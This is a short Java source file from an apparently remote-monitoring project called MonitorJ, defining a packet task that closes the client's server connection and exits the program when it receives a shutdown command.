package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.MonitorJStub;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

/**
 * Created by Josh on 21/06/2015.
 */
public class ShutdownClientApplicationTask extends PacketTask {

    public ShutdownClientApplicationTask() {
        super(Packets.SHUTDOWN_CLIENT_APPLICATION);
    }

    @Override
    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
        MonitorJStub.getInstance().getClientServerConnection().getServerSocketConnection().close();
        System.exit(0);
    }
}
